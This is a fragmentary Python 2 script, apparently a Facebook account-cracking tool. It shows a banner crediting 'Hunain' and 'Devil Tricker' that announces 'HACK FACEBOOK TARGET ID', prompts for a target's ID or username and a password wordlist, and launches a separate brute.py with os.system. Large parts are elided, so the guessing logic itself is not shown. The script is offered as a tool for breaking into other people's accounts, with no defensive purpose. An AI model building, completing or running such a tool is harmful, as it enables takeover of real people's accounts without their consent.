...
def banner():
    ...
    time.sleep(1.5)
    print GG+"  √=============================================√"
    print GL+"  |•••••• Script Written By Hunain ••••••|"
    print GG+"  √=============================================√"
    print WW+"  |            MOD BY: Devil Tricker           |"
    print GL+"  |        The Name Of Interest       |"
    print WW+"  |            FACEBOOK PAGE : DEVIL TRICKER           |"
    print Y+"  |             INSTAGRAM: HUNAIN4075              |"
    print GL+"  |---------------------------------------------|"
    print GL+"  |        DEVIL TRICKER [ D.T]         |"
    print GL+"  |---------------------------------------------|"
    print GG+"  √=============================================√"
    print GL+"  |•••••••••   HACK FACEBOOK TARGET ID ^_^   •••••••••|"
    print GG+"  √=============================================√"

banner()

print wd+"         https://github.com/Devil667 "
print GG+"╭────\033[91m[\033[96m TARGET ID LINK\033[95m / \033[96mUsername Target\033[91m ] "
email_target = str(raw_input(GL+"\033[92m╰────➲\033[93m  "))
print " "
print "\033[92m╭────\033[91m[ \033[96mWRITE File Wordlist \033[95m( nain.txt ) \033[91;1m]"
...
def pil():
                print GG+" "
                g = str(raw_input("[?] HACKED BY HUNAIN..\033[93;1m[y/n]: "))
                if g == 'y' or g == 'Y':
                    os.system('python2 brute.py')
                elif g == 'n' or g == 'N':
                    print wd+"YE KIA KIYA HA..."
                    sys.exit()
                else:
                    print RR+"OK..."
                    pil()
    ...
    .s-     --                      .:     -s.
     ...
     -s.     `--`                `.-`     .s-
      ...
      """
         ...
         print wd+" [#] Password saat ini\033[97;1m:", len(nuub),'password'
